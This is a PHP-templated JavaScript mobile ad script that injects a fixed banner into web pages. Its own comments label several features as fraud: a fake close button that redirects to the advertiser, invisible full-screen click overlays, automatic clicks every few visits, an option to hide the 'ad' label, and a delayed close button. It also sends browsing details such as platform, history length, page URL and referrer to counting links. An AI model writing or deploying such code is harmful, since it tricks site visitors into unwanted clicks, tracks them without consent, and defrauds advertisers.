;(function() {
	var uid = "<?=$GCIDS?>";
    
	// 防止同位置广告出现多次
	if(window[uid] != undefined){
		return false;
	}

	var O = window[uid] = {}, doc = document;

	// 处于方便考虑，php输出的都包含在字符串中。  所有比较都值用弱类型比较==，不用强类型===
	O.L = {
		islogo:"<?=$user_adp['islogo']?>",
		gotourls:<?=json_encode($gotourls)?>,
		gotourl:"<?=$gotourls[0]?>",
		i:1,
		imgsrc:<?=json_encode($imgsrc)?>,
		urllinks:<?=json_encode($imgcounturl)?>,
		is_open: "<?=$config['is_open']?>",//上下摆动开关
		countUrl: "<?=$imgcounturl[0]?>&refso="+(window.DeviceOrientationEvent ? 1 : 0)+"_"+navigator.platform+"_"+history.length+"&url="+encodeURIComponent(document.location)+"&reurl="+encodeURIComponent(document.referrer),
		pvurl : "<?=$pv_url?>",		// 广告点击计费链接        
		linkImg: "<?=$imgsrc[0]?>",	// 保存选中的图片链接
		zx: 2147483647,
		closePic: "<?=PICURLURL?>afa.png",	// 关闭按钮图片
		fakedClosePic: "<?=PICURLURL.$faked_close?>",	// 假关闭按钮
		isiframe: "<?=$config['isiframe']?>",	// iframe不要横竖屏判断
		sh: "<?=$config['sh']?>",
		pos: "<?=$ad_pos?>",	//1 底部 和 2顶部
		closebtn: "<?=$config['closebtn']?>",	// 关闭按钮  开关
		fakedclose: "<?=$config['fakedclose']?>",	// 关闭按钮随机跳转广告主链接 开关
		isfakebtn: "<?=$config['isfakebtn']?>",	// 假关闭功能
		islayer: "<?=$config['islayer']?>",		// 半屏浮层
		fulllayer: "<?=$config['fulllayer']?>",	// 全局浮层 1开 0关
		fullN: "<?=$config['fullN']?>",		// 全局浮层开启时，避免浮层出现的次数
		fullM: "<?=$config['fullM']?>",		// 全局浮层的触发系数
		fakedN: "<?=$config['fakedN']?>",		// 欺诈按钮开启时，避免欺诈的次数
		fakedM: "<?=$config['fakedM']?>",		// 欺诈按钮的触发系数                         
		X: "<?=$config['H']?>",			// 增加点击的隐影面积大小
		refreshN: "<?=$config['refreshN']?>",	// 自动跳转的系数，每多少次就自动跳转 0关
		isshake: "<?=$config['isshake']?>",		// 是否抖动 开关
		shakecycle: "<?=$config['shakecycle']?>",	// 抖动循环周期
	};

	var A = 'A'+uid, C = 'C'+uid, L = 'L'+uid, M = 'M'+uid, Q = 'Q'+uid, S = 'S'+uid, I = 'I'+uid, T = 'T'+uid, X = 'X'+uid, Z = 'Z'+uid;
	
	O.div = doc.createElement('div');
	O.div.id = C;

	O.$ = function(e){
		return document.getElementById(e);
	};

	O.setCookie = function(name,value){
		var exp = new Date;
		exp.setHours(0);
		exp.setMinutes(0);
		exp.setSeconds(0);
		exp.setTime(exp.getTime() + 86400 * 1000 - 1);
		document.cookie = name + "="+ encodeURI(value) + ";expires=" + exp.toGMTString();
	};
	O.getCookie = function(name){
		var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
		if(arr=document.cookie.match(reg)){
			return decodeURI(arr[2]);
		}else{
			O.setCookie(name,1);
			return 1;
		}
	};

	O.xhr = function(url,callback){
        var xhr;
        if(window.XMLHttpRequest){
            xhr = new XMLHttpRequest;
        }
        if(xhr){
            xhr.onreadystatechange = function(){
                if(xhr.readyState == 4 && xhr.status == 200){
                    if(callback) callback.call();
                }
            };
            xhr.open("GET", url);
            xhr.send(null);
        }else{
        	return 1;
        }
    };

	O.linkgo = function(act){
		if(act == 6 && O.$(Q)){
			O.$(Q).style.display = 'none';
		}

		window.location.href = O.L.gotourl;
	};

	O.shake = function(j){

		var ds = O.$(X).style;
		j++;
		if(j > 15){
			ds.left = 0;
			O.L.pos == 1 ? ds.top = 0 : ds.bottom = 0;
			if(O.L.shakecycle){
				setTimeout('window["'+uid+'"].shake(0)', window[uid].L.shakecycle*1000);
			}
			return false;
		}
		var pos = j%2 ? '2px' : '-2px';
		ds.left = pos;
		O.L.pos == 1 ? ds.top = pos : ds.bottom = pos;
		setTimeout('window["'+uid+'"].shake('+j+')',60);
	};

	O.hidePlace = function(){
		if(O.$(M)){
			var placediv = O.$(M);
			var h = parseInt(placediv.style.height);
			if(h > 20){
				placediv.style.height = (h-20)+'px';
				setTimeout('window["'+uid+'"].hidePlace()',60);
			}else{
				placediv.style.height = '0';
				placediv.style.display = 'none';
			}
		}
	};

	O.hideCon = function(){
		if(O.L.fakedclose == 1) O.linkgo(2);
		O.$(C).style.display = 'none';
		O.hidePlace();
	};
    O.addEvent = function(obj,type,fn){if(obj.attachEvent){obj.attachEvent('on'+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};
	O.ready = function(fn){

	    if(document.addEventListener) {

	        document.addEventListener('DOMContentLoaded', function() {
	       
	            document.removeEventListener('DOMContentLoaded',arguments.callee, false);
	            console.log('sss');
	            fn();            
	        }, false);
	    }else if(document.attachEvent) {       
	        document.attachEvent('onreadystatechange', function() {
	            if(document.readyState == 'complete') {
	                document.detachEvent('onreadystatechange', arguments.callee);
	                fn();      
	            }
	        });
	    }
	};

	O.openWin = function(obj){
		O.addEvent(obj,'click',function(){
			if(navigator.platform.indexOf("Win") > -1 || navigator.platform.indexOf("Mac") > -1){window.location = O.L.countUrl;return;}
			window.open(O.L.countUrl, '_blank');
		});
        
	}

	O.createCon = function(){
        
		var ww = document.body.offsetWidth?(document.body.offsetWidth+'px'):'100%';
        <?php if($userid==4110){ ?>ww='100%';<?php } ?>
		var style = '#'+C+'{position:fixed;z-index:'+O.L.zx+';width:'+ww+' !important;line-height:0;left:0;';
		style += O.L.pos == 2?'bottom:0;':'top:0;';
		style += 'max-height:300px;';
		style += 'clear:both;}#'+C+' *{width:100%;border:none;}';

		style += '#'+X+'{position:relative;width:'+ww+';z-index:'+(O.L.zx-3)+((O.L.sh == 1)?";height:80px;}":";}");
		if(O.L.islayer == 1){
			style += '#'+Z+'{display:inline-block;position:absolute;'+(O.L.pos == 2?'bottom':'top')+':0%;left:0;margin:0px;width:100%;height:'+(100+O.L.X*2)+'%;z-index:'+(O.L.zx-2)+';}';
		}
		if(O.L.fulllayer == 1){
			style += '#'+Q+'{display:inline-block;position:absolute;'+(O.L.pos == 2?'bottom':'top')+':0%;left:0;margin:0;width:100%;height:1000%;z-index:'+(O.L.zx-2)+';}';
		}
		style += '#'+A+'{display:inline-block;position:absolute;top:0;left:0;margin:0;height:100%;z-index:'+(O.L.zx-1)+';}';
		if(O.L.closebtn == 1){
			style += '#'+I+'{position:absolute;'+(O.L.pos == 1?'bottom:':'top:')+'-18px;right:0;z-index:'+O.L.zx+';width:20px;height:18px;background:rgba(<?=$close_bg?>);font-size:15px;text-align:center;line-height:19px;color:#fff;font-family: Arial;text-decoration:none;}';
		}else if(O.L.closebtn == 2){
			style += '#'+I+'{position:absolute;'+(O.L.pos == 1?'bottom:':'top:')+'-18px;right:0;z-index:'+O.L.zx+';width:20px;height:18px;background:rgba(<?=$close_bg?>);font-size:15px;text-align:center;line-height:19px;color:#fff;font-family: Arial;text-decoration:none;}';
		}
	
		style += '#'+T+'{position:absolute;right:0;bottom:0;z-index:'+(O.L.zx)+';font-size:9px;color:#fff;background:rgba(<?=$font_bg?>);display:inline-block;width:26px;height:12px;line-height:14px;text-align:center;border-radius:5px 0;}';
		if(O.L.isfakebtn == 1){
			style += '#'+S+'{position:absolute;left:0;top:0;z-index:'+(O.L.zx)+';color:#f00;display:inline-block;width:auto;height:auto;max-height:20%;line-height:20px;text-align:center;border-radius:10px;font-weight: bold;font-size:20px;}';
		}
		if(O.L.isiframe != 1){
			style += '@media all and(orientation:portrait){#'+C+'{width:100%;}}';
			style += '@media all and(orientation:landscape){#'+C+'{width:50%;left:25%;}#'+Z+'{width:200%;left:-50%;}}';
		}

		try{
			var head = doc.getElementsByTagName('head')[0];
			var s = doc.createElement('style');
			s.type = 'text/css';
			if(s.styleSheet){
				s.styleSheet.cssText = style;
			}else{
				s.appendChild(doc.createTextNode(style));
			}
			head.appendChild(s);
		}catch(e){}

		var div_con = '<div>';
		div_con += '<img id="'+X+'">';
		if(O.L.islayer == 1){
			div_con += '<a id="'+Z+'" ></a>';
		}
		if(O.L.fulllayer == 1){
			div_con += '<a id="'+Q+'"  href="javascript:;" onclick="'+uid+'.linkgo(6);"></a>';
		}
		div_con += '<a id="'+A+'" ></a>';
		if(O.L.closebtn != 0){
			div_con += '<a id="'+I+'" href="javascript:;" onclick="'+uid+'.hideCon();">X</a>';
		}
		if(O.L.islogo == 0){
			div_con += '<span id="'+T+'">\u5E7F\u544A</span>';	// 广告2字不显示
		}
		if(O.L.isfakebtn == 1){
			div_con += '<a id="'+S+'" onclick="'+uid+'.linkgo(7);"><img src="'+O.L.fakedClosePic+'" style="max-width:18px !important;max-height:18px !important;"></a>';
		}
		div_con += '</div>';

		try{
			var body = doc.body || doc.getElementsByTagName('html')[0];
			O.div.innerHTML = div_con;
			body.appendChild(O.div);
            
			// 设置关闭按钮延迟显示
			setTimeout(function(){
				O.$(I).style.display = 'inline-block';
			},2000);
			if(O.L.isshake == 1){
				setTimeout('window["'+uid+'"].shake(0)', 1*O.L.pos);
			}

			O.div.style.display = 'block';
			if(w == 1) O.div.style.height = '60px';
		}catch(e){}
	};

	O.init = function(){
		try{
			O.coopv = parseInt(O.getCookie('coopv'+uid));
			if(O.L.fakedclose == 1){
				O.L.fakedclose = 0;
				if(O.coopv >= O.L.fakedN){
					if(O.getCookie('fakedclose'+uid) == O.coopv){
						O.L.fakedclose = 1;
					}else{
						O.L.fakedclose = 0;
					}
					if((O.coopv - O.L.fakedN)%O.L.fakedM == 0){
						O.setCookie('fakedclose'+uid,(Math.floor(Math.random()*O.L.fakedM)+1) + O.coopv);
					}
				}
			}

			if(O.L.fulllayer == 1){
				O.L.fulllayer = 0;
				if(O.coopv > O.L.fullN){
					if((O.coopv - O.L.fullN)%O.L.fullM == 0){
						O.L.fulllayer = 1;
					}
					if(O.L.fullM == 0) O.L.fulllayer = 1;
				}
				if(O.coopv == O.L.fullN) O.L.fulllayer = 1;
			}

			O.setCookie('coopv'+uid,++O.coopv);
		}catch(e){}
	};
	O.loadImg = function(url,callback){
		var img = new Image;
		img.src = url;
		if(callback){
			if(img.complete){
				callback.call(img);
				return false;
			}
			img.onload = function(){
				callback.call(img);
			};
		}
	};

	O.createScript = function(url){
         var b , a = document.createElement('script');
         a.src = url; 
         b = document.getElementsByTagName("html")[0];
         b.appendChild(a);
	}

	O.cube = function(){
		
        if(O.L.is_open == 1){
			var t = {Bounce:{easeOut:function(t,e,n,a){
				                        return(t/=a)<1/2.75?n*(7.5625*t*t)+e:t<2/2.75?n*(7.5625*(t-=1.5/2.75)*t+.75)+e:t<2.5/2.75?n*(7.5625*(t-=2.25/2.75)*t+.9375)+e:n*(7.5625*(t-=2.625/2.75)*t+.984375)+e
				                    }
		                  }
		            },
		        e=O.$(C);
		        e.style.opacity=0;
		    var n=70,f = O.L.pos == 1 ? 'top' : 'bottom';
		        a=doc.getElementsByName("viewport");
		        a.length>0&&(n=parseInt(window.screen.height/20,10)),
		        e.style[f]=n+"px";
		    var r=function(){
		    	    var a=0,o=100,
		    	    r=function(){
		    	    	a++;
		    	    	var i=t.Bounce.easeOut(a,-n,n,o);
		    	    	e.style[f]=Math.abs(i)+"px",
		    	    	e.style.opacity=1-(o-a)/o,
		    	    	a<o&&setTimeout(r,1e3/60)
		    	    };
		    	    r();
		    	};
		        r();
		}
		
	}

	O.addParams = function(){

		for(var i in O.L.urllinks){
			O.L.urllinks[i] = O.L.urllinks[i]+"&refso="+(window.DeviceOrientationEvent ? 1 : 0)+"_"+navigator.platform+"_"+history.length+"&url="+encodeURIComponent(document.location)+"&reurl="+encodeURIComponent(document.referrer);
		}
	}

	O.changeImage = function(){
		setTimeout(function(){
			setInterval(function(){

				if(O.L.i >= 3)O.L.i=0;
	  
                O.L.gotourl = O.L.gotourls[O.L.i];
		
				O.$(X).src = O.L.imgsrc[O.L.i];
				O.L.countUrl = O.L.urllinks[O.L.i];
				O.L.i++;
			}, 15e3);
		}, 1e3/60);
	}

	try{

	<?php if($onload){ ?> O.ready(function(){ <?php } ?>

		O.init();

		if(O.L.closebtn != 0) O.loadImg(O.L.closePic);
	    O.createCon(window.innerWidth,window.innerHeight);

		O.loadImg(O.L.linkImg,function(){
			var w = this.width,h = this.height;
			var placediv = doc.createElement('div');
			placediv.id = M;
			placediv.style.height = (h*window.innerWidth/w)+'px';
			placediv.style.width = '100%';
			O.$(C).style.height = (h*document.body.offsetWidth/w)+'px';

			O.$(X).src = O.L.linkImg;
			O.$(X).style.height = (h*document.body.offsetWidth/w)+'px';

			if(O.L.pos == 1){
				var body = doc.body;
				body.insertBefore(placediv, body.firstChild);
			}else{
				doc.getElementsByTagName('html')[0].appendChild(placediv);
			}

			if(O.L.refreshN.trim() != 0){
				O.coorefresh = O.getCookie('refreshN');
				if((O.coorefresh-1)%O.L.refreshN == 0){
					O.$(A).click();
				}
				O.setCookie('refreshN',++O.coorefresh);
			}

		});

		setTimeout(O.cube,2e3);setInterval(O.cube,10e3);

		O.addParams();
		O.changeImage();
		var rand_num = Math.floor(Math.random()*10+1);
		if(rand_num == 1)O.createScript(O.L.pvurl);
		
		if(O.L.islayer == 1)
			O.openWin(O.$(Z));
		
		if(O.L.fulllayer == 1)
			O.openWin(O.$(Q));
		O.openWin(O.$(A));
		
	<?php if($onload){ ?> }); <?php } ?>
    
	}catch(e){}
})();
